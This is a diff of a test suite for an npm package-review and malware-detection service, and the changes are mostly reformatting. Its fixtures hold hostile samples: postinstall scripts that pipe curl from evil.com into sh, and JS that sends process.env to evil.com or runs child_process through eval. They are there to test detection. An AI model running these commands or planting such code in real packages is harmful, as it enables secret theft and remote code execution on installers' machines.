@@ -1,11 +1,4 @@
-import {
-	describe,
-	it,
-	expect,
-	beforeAll,
-	afterEach,
-	vi,
-} from "vitest";
+import { describe, it, expect, beforeAll, afterEach, vi } from "vitest";
 import { env, exports } from "cloudflare:workers";
 import { analyzePackage } from "../review/analyze.js";
 import { processReviewInline } from "../review/consumer.js";
@@ -41,7 +34,7 @@ function buildTarEntry(filePath: string, content: string): Uint8Array {
 	header.set(encoder.encode(sizeStr), 124);
 	header[135] = 0;
 
-	header[156] = 48; // '0' — regular file
+	header[156] = 48; // '0' - regular file
 
 	const entry = new Uint8Array(512 + paddedSize);
 	entry.set(header, 0);
@@ -84,7 +77,11 @@ type MockEntry =
  * generateObject with a schema sends structured output instructions
  * and expects the result as text content in the response output.
  */
-function makeAiResponse(riskScore: number, summary: string, findings: any[] = []) {
+function makeAiResponse(
+	riskScore: number,
+	summary: string,
+	findings: any[] = [],
+) {
 	const resultObj = { riskScore, findings, summary };
 	return {
 		id: "resp_test_001",
@@ -185,7 +182,7 @@ afterEach(() => {
 
 // ─── Tests ──────────────────────────────────────────────────────────
 
-describe("analyzePackage — static analysis detections", () => {
+describe("analyzePackage - static analysis detections", () => {
 	it("flags packages with install scripts", async () => {
 		const metadata = {
 			name: "evil-install",
@@ -198,19 +195,24 @@ describe("analyzePackage — static analysis detections", () => {
 						postinstall: "curl https://evil.com/steal | sh",
 						preinstall: "node exploit.js",
 					},
-					dist: { tarball: "https://registry.npmjs.org/evil-install/-/evil-install-1.0.0.tgz", shasum: "abc" },
+					dist: {
+						tarball:
+							"https://registry.npmjs.org/evil-install/-/evil-install-1.0.0.tgz",
+						shasum: "abc",
+					},
 					dependencies: {},
 				},
 			},
 			"dist-tags": { latest: "1.0.0" },
-			time: { created: "2020-01-01T00:00:00Z", "1.0.0": "2024-06-01T00:00:00Z" },
+			time: {
+				created: "2020-01-01T00:00:00Z",
+				"1.0.0": "2024-06-01T00:00:00Z",
+			},
 			maintainers: [{ name: "test" }],
 		};
 
 		mockFetchFor(
-			new Map([
-				[upstreamUrl("evil-install"), { status: 200, json: metadata }],
-			]),
+			new Map([[upstreamUrl("evil-install"), { status: 200, json: metadata }]]),
 		);
 
 		const result = await analyzePackage(env, "evil-install", "1.0.0");
@@ -219,8 +221,12 @@ describe("analyzePackage — static analysis detections", () => {
 			(f) => f.category === "install-scripts",
 		);
 		expect(installFindings.length).toBeGreaterThanOrEqual(2);
-		expect(installFindings.some((f) => f.message.includes("postinstall"))).toBe(true);
-		expect(installFindings.some((f) => f.message.includes("preinstall"))).toBe(true);
+		expect(installFindings.some((f) => f.message.includes("postinstall"))).toBe(
+			true,
+		);
+		expect(installFindings.some((f) => f.message.includes("preinstall"))).toBe(
+			true,
+		);
 		expect(installFindings.every((f) => f.severity === "high")).toBe(true);
 		expect(result.riskScore).toBeGreaterThan(0.2);
 	});
@@ -234,9 +240,7 @@ describe("analyzePackage — static analysis detections", () => {
 			'process.env.SECRET; fetch("https://evil.com/exfil");',
 		].join("\n");
 
-		const tgz = await buildTarGz([
-			{ path: "index.js", content: maliciousJs },
-		]);
+		const tgz = await buildTarGz([{ path: "index.js", content: maliciousJs }]);
 
 		const metadata = {
 			name: "obfuscated-pkg",
@@ -246,14 +250,18 @@ describe("analyzePackage — static analysis detections", () => {
 					name: "obfuscated-pkg",
 					version: "1.0.0",
 					dist: {
-						tarball: "https://registry.npmjs.org/obfuscated-pkg/-/obfuscated-pkg-1.0.0.tgz",
+						tarball:
+							"https://registry.npmjs.org/obfuscated-pkg/-/obfuscated-pkg-1.0.0.tgz",
 						shasum: "abc",
 					},
 					dependencies: {},
 				},
 			},
 			"dist-tags": { latest: "1.0.0" },
-			time: { created: "2020-01-01T00:00:00Z", "1.0.0": "2024-06-01T00:00:00Z" },
+			time: {
+				created: "2020-01-01T00:00:00Z",
+				"1.0.0": "2024-06-01T00:00:00Z",
+			},
 			maintainers: [{ name: "test" }],
 		};
 
@@ -276,8 +284,17 @@ describe("analyzePackage — static analysis detections", () => {
 
 		const categories = obfuscationFindings.map((f) => f.message);
 		expect(categories.some((m) => m.includes("_0x pattern"))).toBe(true);
-		expect(categories.some((m) => m.includes("base64") || m.includes("Buffer.from"))).toBe(true);
-		expect(categories.some((m) => m.includes("eval") || m.includes("child_process") || m.includes("process.env"))).toBe(true);
+		expect(
+			categories.some((m) => m.includes("base64") || m.includes("Buffer.from")),
+		).toBe(true);
+		expect(
+			categories.some(
+				(m) =>
+					m.includes("eval") ||
+					m.includes("child_process") ||
+					m.includes("process.env"),
+			),
+		).toBe(true);
 
 		expect(result.riskScore).toBeGreaterThan(0.4);
 	});
@@ -290,23 +307,30 @@ describe("analyzePackage — static analysis detections", () => {
 				"1.0.0": {
 					name: "no-maint-pkg",
 					version: "1.0.0",
-					dist: { tarball: "https://registry.npmjs.org/no-maint-pkg/-/no-maint-pkg-1.0.0.tgz", shasum: "x" },
+					dist: {
+						tarball:
+							"https://registry.npmjs.org/no-maint-pkg/-/no-maint-pkg-1.0.0.tgz",
+						shasum: "x",
+					},
 					dependencies: {},
 				},
 			},
 			"dist-tags": { latest: "1.0.0" },
-			time: { created: "2020-01-01T00:00:00Z", "1.0.0": "2024-06-01T00:00:00Z" },
+			time: {
+				created: "2020-01-01T00:00:00Z",
+				"1.0.0": "2024-06-01T00:00:00Z",
+			},
 			maintainers: [],
 		};
 
 		mockFetchFor(
-			new Map([
-				[upstreamUrl("no-maint-pkg"), { status: 200, json: metadata }],
-			]),
+			new Map([[upstreamUrl("no-maint-pkg"), { status: 200, json: metadata }]]),
 		);
 
 		const result = await analyzePackage(env, "no-maint-pkg", "1.0.0");
-		const finding = result.findings.find((f) => f.category === "no-maintainers");
+		const finding = result.findings.find(
+			(f) => f.category === "no-maintainers",
+		);
 		expect(finding).toBeTruthy();
 		expect(finding!.severity).toBe("medium");
 	});
@@ -314,7 +338,11 @@ describe("analyzePackage — static analysis detections", () => {
 	it("returns max risk score for nonexistent packages", async () => {
 		mockFetchFor(new Map());
 
-		const result = await analyzePackage(env, "this-does-not-exist-xyz", "1.0.0");
+		const result = await analyzePackage(
+			env,
+			"this-does-not-exist-xyz",
+			"1.0.0",
+		);
 		expect(result.riskScore).toBe(1.0);
 		expect(result.findings.some((f) => f.category === "existence")).toBe(true);
 	});
@@ -344,12 +372,19 @@ describe("analyzePackage — static analysis detections", () => {
 				"1.0.0": {
 					name: "dep-test-pkg",
 					version: "1.0.0",
-					dist: { tarball: "https://registry.npmjs.org/dep-test-pkg/-/dep-test-pkg-1.0.0.tgz", shasum: "x" },
+					dist: {
+						tarball:
+							"https://registry.npmjs.org/dep-test-pkg/-/dep-test-pkg-1.0.0.tgz",
+						shasum: "x",
+					},
 					dependencies: { "shady-dep": "^1.0.0" },
 				},
 			},
 			"dist-tags": { latest: "1.0.0" },
-			time: { created: "2020-01-01T00:00:00Z", "1.0.0": "2024-06-01T00:00:00Z" },
+			time: {
+				created: "2020-01-01T00:00:00Z",
+				"1.0.0": "2024-06-01T00:00:00Z",
+			},
 			maintainers: [{ name: "test" }],
 		};
 
@@ -381,7 +416,7 @@ describe("analyzePackage — static analysis detections", () => {
 	});
 });
 
-describe("processReviewInline — consumer pipeline", () => {
+describe("processReviewInline - consumer pipeline", () => {
 	it("auto-approves clean packages", async () => {
 		const metadata = makeNpmMetadata("review-pipeline-pkg", ["1.0.0"]);
 		mockFetchFor(
@@ -430,9 +465,9 @@ describe("processReviewInline — consumer pipeline", () => {
 
 	it("auto-rejects high-risk packages and stores parseable findings", async () => {
 		const maliciousCode = [
-			'const _0xdead01 = process.env; _0xdead02 = _0xdead01;',
+			"const _0xdead01 = process.env; _0xdead02 = _0xdead01;",
 			'fetch("https://evil.com?" + JSON.stringify(process.env));',
-			'eval("require" + "(\'child_process\').exec(\'id\')");',
+			"eval(\"require\" + \"('child_process').exec('id')\");",
 			'Buffer.from("' + "Z".repeat(80) + '", "base64");',
 		].join("\n");
 		const tgz = await buildTarGz([
@@ -451,12 +486,19 @@ describe("processReviewInline — consumer pipeline", () => {
 						preinstall: "curl https://evil.com | sh",
 						install: "node exploit.js",
 					},
-					dist: { tarball: "https://registry.npmjs.org/findings-json-pkg/-/findings-json-pkg-1.0.0.tgz", shasum: "x" },
+					dist: {
+						tarball:
+							"https://registry.npmjs.org/findings-json-pkg/-/findings-json-pkg-1.0.0.tgz",
+						shasum: "x",
+					},
 					dependencies: {},
 				},
 			},
 			"dist-tags": { latest: "1.0.0" },
-			time: { created: "2020-01-01T00:00:00Z", "1.0.0": "2024-06-01T00:00:00Z" },
+			time: {
+				created: "2020-01-01T00:00:00Z",
+				"1.0.0": "2024-06-01T00:00:00Z",
+			},
 			maintainers: [],
 		};
 
@@ -468,7 +510,10 @@ describe("processReviewInline — consumer pipeline", () => {
 					{ status: 200, buffer: tgz },
 				],
 			]),
-			{ riskScore: 1.0, summary: "Extremely malicious: data exfiltration and code execution." },
+			{
+				riskScore: 1.0,
+				summary: "Extremely malicious: data exfiltration and code execution.",
+			},
 		);
 
 		const pkgId = await createPackage(env.DB, {
@@ -513,7 +558,7 @@ describe("processReviewInline — consumer pipeline", () => {
 	});
 });
 
-describe("end-to-end — malicious package with obfuscated tarball", () => {
+describe("end-to-end - malicious package with obfuscated tarball", () => {
 	it("reviews a package with malicious code and blocks it from metadata", async () => {
 		const maliciousCode = [
 			'const _0xbeef01 = require("child_process"); _0xbeef02 = _0xbeef01;',
@@ -525,7 +570,10 @@ describe("end-to-end — malicious package with obfuscated tarball", () => {
 
 		const tgz = await buildTarGz([
 			{ path: "index.js", content: maliciousCode },
-			{ path: "package.json", content: '{"name":"malware-sim","version":"2.0.0"}' },
+			{
+				path: "package.json",
+				content: '{"name":"malware-sim","version":"2.0.0"}',
+			},
 		]);
 
 		const metadata = {
@@ -536,7 +584,8 @@ describe("end-to-end — malicious package with obfuscated tarball", () => {
 					name: "malware-sim",
 					version: "1.0.0",
 					dist: {
-						tarball: "https://registry.npmjs.org/malware-sim/-/malware-sim-1.0.0.tgz",
+						tarball:
+							"https://registry.npmjs.org/malware-sim/-/malware-sim-1.0.0.tgz",
 						shasum: "prev",
 					},
 					dependencies: {},
@@ -546,7 +595,8 @@ describe("end-to-end — malicious package with obfuscated tarball", () => {
 					version: "2.0.0",
 					scripts: { postinstall: "node index.js" },
 					dist: {
-						tarball: "https://registry.npmjs.org/malware-sim/-/malware-sim-2.0.0.tgz",
+						tarball:
+							"https://registry.npmjs.org/malware-sim/-/malware-sim-2.0.0.tgz",
 						shasum: "curr",
 					},
 					dependencies: { "shady-exfil-lib": "^1.0.0" },
@@ -563,9 +613,14 @@ describe("end-to-end — malicious package with obfuscated tarball", () => {
 
 		const aiResponse = {
 			riskScore: 0.95,
-			summary: "Almost certainly malicious: obfuscated exfiltration of env vars.",
+			summary:
+				"Almost certainly malicious: obfuscated exfiltration of env vars.",
 			findings: [
-				{ severity: "critical" as const, category: "ai-exfiltration", message: "Code exfiltrates process.env to external server" },
+				{
+					severity: "critical" as const,
+					category: "ai-exfiltration",
+					message: "Code exfiltrates process.env to external server",
+				},
 			],
 		};
 
@@ -586,7 +641,9 @@ describe("end-to-end — malicious package with obfuscated tarball", () => {
 						status: 200,
 						json: {
 							name: "shady-exfil-lib",
-							time: { created: new Date(Date.now() - 2 * 86_400_000).toISOString() },
+							time: {
+								created: new Date(Date.now() - 2 * 86_400_000).toISOString(),
+							},
 						},
 					},
 				],
@@ -630,7 +687,9 @@ describe("end-to-end — malicious package with obfuscated tarball", () => {
 						status: 200,
 						json: {
 							name: "shady-exfil-lib",
-							time: { created: new Date(Date.now() - 2 * 86_400_000).toISOString() },
+							time: {
+								created: new Date(Date.now() - 2 * 86_400_000).toISOString(),
+							},
 						},
 					},
 				],
@@ -674,8 +733,12 @@ describe("end-to-end — malicious package with obfuscated tarball", () => {
 
 		const findings = JSON.parse(review.findings);
 		expect(findings.some((f: any) => f.category === "obfuscation")).toBe(true);
-		expect(findings.some((f: any) => f.category === "install-scripts")).toBe(true);
-		expect(findings.some((f: any) => f.category === "ai-exfiltration")).toBe(true);
+		expect(findings.some((f: any) => f.category === "install-scripts")).toBe(
+			true,
+		);
+		expect(findings.some((f: any) => f.category === "ai-exfiltration")).toBe(
+			true,
+		);
 
 		const version = await env.DB.prepare(
 			"SELECT status FROM package_version WHERE id = ?",
